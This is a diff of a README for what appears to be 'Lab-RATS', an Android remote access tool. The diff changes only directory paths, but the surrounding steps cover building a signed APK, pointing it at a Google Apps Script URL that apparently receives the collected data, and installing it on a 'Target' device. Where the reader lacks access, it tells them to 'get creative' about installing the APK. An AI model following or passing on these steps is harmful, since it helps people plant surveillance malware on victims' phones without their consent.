@@ -120,14 +120,14 @@ Unlike IPv4—which is **heavily restricted by NAT** and requires complex port f
 
 ### 2. Build the APK (on PC)
 1.  **Download & Extract** the repository zip.
-2.  Navigate to `cd /Lab-RATS/app-builder/`.
+2.  Navigate to `cd /Lab-RATS-main/app-builder/`.
 3.  Execute the builder:
     *   **Windows**: `build.bat`
     *   **Linux/Mac**: `chmod +x build.sh && ./build.sh`
 4.  Select **Option 1** and provide your configuration:
     *   **App Name**: *(Default: LAB-RATS)*
     *   **Google Sheet URL**: Enter your **Apps Script URL** *(Setup instructions below)*
-5.  Retrieve your `signed.apk` from the `/Lab-RATS/app-builder/output/` directory.
+5.  Retrieve your `signed.apk` from the `/Lab-RATS-main/app-builder/output/` directory.
 
 ### 3. Install App on Target/Test Device
 1. Install the `signed.apk` onto the **Target/Test Android phone or tablet** *(If you have access to the device, turn on USB debugging in developer settings, plug into your PC and use `adb install signed.apk`, otherwise get creative on "how to" install  `.apk` methods)*. 
